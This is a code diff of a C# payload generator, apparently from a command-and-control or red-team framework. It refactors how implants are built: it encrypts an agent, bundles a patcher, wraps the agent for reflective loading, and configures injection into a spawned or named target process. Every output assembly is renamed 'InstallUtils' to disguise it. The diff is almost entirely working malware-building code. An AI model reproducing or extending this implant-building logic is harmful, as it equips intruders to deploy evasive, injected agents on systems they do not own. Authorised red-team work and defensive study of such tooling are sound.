@@ -1,14 +1,15 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
-using System.Security.Cryptography;
 
 namespace Common.Payload;
 
 using System.IO;
 using Common.Config;
+using Common.Models;
 
 public partial class PayloadGenerator
 {
@@ -56,16 +57,16 @@ public partial class PayloadGenerator
     public byte[] GenerateImplant(ImplantConfig options)
     {
         byte[] agentbytes = null;
-        if(options.Type != ImplantType.Elf)
-            if (options.IsInjected && options.Type != ImplantType.Library)
-            {
-                agentbytes = PrepareAgent(options, false);
-                agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == ImplantType.Service);
-            }
-            else
-            {
-                agentbytes = PrepareAgent(options, options.Type == ImplantType.Service);
-            }
+        if(options.Type == ImplantType.Elf && options.IsInjected)
+            throw new ArgumentException("Injected ELF implants are not supported.");
+
+        agentbytes = PrepareAgent(options, options.Type == ImplantType.Service && !options.IsInjected);
+
+        if (options.IsInjected)
+        {
+            var shellcode = this.ReflectiveLibraryEncapsulation(options, agentbytes);
+            agentbytes = this.PrepareInjectedAgent(options, shellcode, options.Type == ImplantType.Service);
+        }
 
         byte[] implantData = null;
         switch (options.Type)
@@ -265,8 +266,6 @@ public partial class PayloadGenerator
 
     public byte[] PrepareAgent(ImplantConfig options, bool isService)
     {
-        //Console.WriteLine("Generating encrypted Agent");
-
         this.MessageSent?.Invoke(this, $"Configuring Agent...");
         byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));
 
@@ -296,94 +295,59 @@ public partial class PayloadGenerator
         var patcherb64 = this.Encode(encPatcher.Encrypted);
 
         if (!isService)
-        {
             this.MessageSent?.Invoke(this, $"Creating Starter...");
-            //Create Starter
-            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
-            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
-                    {
-                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
-                        { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
-                        { "Key", encAgent.Secret }
-                    });
-            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
-            if (options.IsDebug)
-                File.WriteAllBytes(this.Debug(options.ImplantName, "Starter.exe"), starter);
-            return resultAgent;
-        }
         else
-        {
-            this.MessageSent?.Invoke(this, $"Creating Service...");
-            //Create Starter
-            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
-            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
+             this.MessageSent?.Invoke(this, $"Creating Service...");
+
+        byte[] baseStarter = null;
+        if (!isService)
+            baseStarter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
+        else
+            baseStarter = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
+
+        baseStarter = AssemblyEditor.ReplaceRessources(baseStarter, new Dictionary<string, object>()
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
                         { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                         { "Key", encAgent.Secret }
                     });
-            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
 
-            if (options.IsDebug)
-                File.WriteAllBytes(this.Debug(options.ImplantName, "ServiceAgent.exe"), agent);
+        var resultAgent = AssemblyEditor.ChangeName(baseStarter, "InstallUtils");
+        if (options.IsDebug)
+            File.WriteAllBytes(this.Debug(options.ImplantName, isService ? "Service.exe" : "Starter.exe"), baseStarter);
+        return resultAgent;
 
-            return resultAgent;
-        }
     }
 
-    public byte[] PrepareInjectedAgent(ImplantConfig options, byte[] agent, bool isService)
+    public byte[] PrepareInjectedAgent(ImplantConfig options, byte[] payload, bool isService)
     {
-        #region binary
-        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
-        var tmpPath = this.Working(tmpFile);
-        File.WriteAllBytes(tmpPath, agent);
-
-        var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
-        var outPath = this.Working(outFile);
-
-        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
-        var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == ImplantArchitecture.x86);
-
-        if (options.IsVerbose)
-        {
-            this.MessageSent?.Invoke(this, executionResult.Command);
-            this.MessageSent?.Invoke(this, executionResult.Out);
-        }
-
-        if (options.IsVerbose)
-            if (executionResult.Result == 0)
-                this.MessageSent?.Invoke(this, "[*] Binary generation succeed.");
-            else
-                this.MessageSent?.Invoke(this, "[X] Binary generation failed.");
-
-        File.Delete(tmpPath);
-        if (executionResult.Result != 0)
-            return null;
-
-        var binBytes = File.ReadAllBytes(outPath); //binary
-        File.Delete(outPath);
-        #endregion
-
-
         #region Injector
         var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
         var encPatcher = this.Encrypt(patchDll);
         var patcherb64 = this.Encode(encPatcher.Encrypted);
 
-        this.MessageSent?.Invoke(this, $"BinLength = {binBytes.Length}");
+        if(options.IsVerbose)
+            this.MessageSent?.Invoke(this, $"PayloadLength = {payload.Length}");
 
         var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));
 
-        string process = options.Architecture == ImplantArchitecture.x64 ? this.SpawnConfig.SpawnToX64 : this.SpawnConfig.SpawnToX86;
-        if (!string.IsNullOrEmpty(options.InjectionProcess))
-            process = options.InjectionProcess;
+        string spawn = options.Architecture == ImplantArchitecture.x64 ? this.SpawnConfig.SpawnToX64 : this.SpawnConfig.SpawnToX86;
+        if (!string.IsNullOrEmpty(options.InjectionProcessSpawn))
+            spawn = options.InjectionProcessSpawn;
+
+        string processId = options.InjectionProcessId.HasValue ? options.InjectionProcessId.Value.ToString() : string.Empty;
+        string processName = options.InjectionProcessName;
+
+        string functionName = ImplantConfig.DefaultReflectiveFunctionName;
 
         injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                     {
-                        { "Implant", binBytes },
-                        { "Host",  process},
+                        { "Payload", payload },
+                        { "ProcessId",  processId},
+                        { "ProcessName",  processName},
+                        { "ProcessSpawn",  spawn},
+                        { "Function",  functionName},
                         { "Delay", options.InjectionDelay.ToString() },
                     });
 
@@ -391,35 +355,28 @@ public partial class PayloadGenerator
         var injectb64 = this.Encode(encInject.Encrypted);
 
         if (!isService)
-        {
             this.MessageSent?.Invoke(this, $"Creating Starter...");
-            //Create Starter
-            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
-            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
-                    {
-                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
-                        { "PatchKey", encPatcher.Secret },
-                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
-                        { "Key", encInject.Secret }
-                    });
-            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
-            return resultAgent;
-        }
         else
-        {
             this.MessageSent?.Invoke(this, $"Creating Service...");
-            //Create Starter
-            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
-            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
+
+        byte[] baseStarter = null;
+        if (!isService)
+            baseStarter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
+        else
+            baseStarter = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
+
+        baseStarter = AssemblyEditor.ReplaceRessources(baseStarter, new Dictionary<string, object>()
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Implant", Encoding.UTF8.GetBytes(injectb64) },
+                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
                         { "Key", encInject.Secret }
                     });
-            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
-            return resultAgent;
-        }
+
+        var resultAgent = AssemblyEditor.ChangeName(baseStarter, "InstallUtils");
+        if (options.IsDebug)
+            File.WriteAllBytes(this.Debug(options.ImplantName, isService ? "InjService.exe" : "InjStarter.exe"), resultAgent);
+        return resultAgent;
 
         #endregion
 
